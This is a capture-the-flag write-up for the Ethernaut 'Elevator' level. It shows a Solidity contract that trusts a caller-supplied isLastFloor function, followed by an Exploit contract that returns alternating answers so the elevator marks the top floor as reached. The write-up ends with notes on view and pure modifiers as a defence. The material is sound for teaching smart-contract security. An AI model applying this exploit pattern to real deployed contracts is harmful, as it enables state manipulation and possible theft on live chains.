# 11. Elevator
<sup>Difficulty 4/10</sup>

This elevator won't let you reach the top of your building. Right?

Things that might help:

- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.

## Solution

We need to get to the `lastFloor`. Let's review the code:

```solidity
contract Elevator {
  bool public top;    // bool variable to store if we are to the last floor
  uint public floor;

  function goTo(uint _floor) public {
  	// The sender is casted to a Building
    Building building = Building(msg.sender);

    // The first `isLastFloor` condition has to return False
    if (! building.isLastFloor(_floor)) {
      floor = _floor; 
      top = building.isLastFloor(floor);  // The second `isLastFloor` has to return True
    }
  }
}
```

We can create a contract that implements the `Building` interface. Using a counter we can return True or False based on a simple `mod` operation.

```solidity
contract Exploit is Building {
    address elevatorAddress = 0x916664889d54C166f9DcE171Aae90B72651da37A;
    Elevator elevator = Elevator(elevatorAddress);
    uint public callNo = 0;
    bool public res;
    function isLastFloor(uint) public override returns (bool) {
        callNo++;
        uint mod = callNo % 2;
        res = mod == 0;
        return mod == 0;
    }
    function exploit() public {
        elevator.goTo(1);
        elevator.goTo(2);  // Top reached
    }
}
```

## OZ Corner

You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.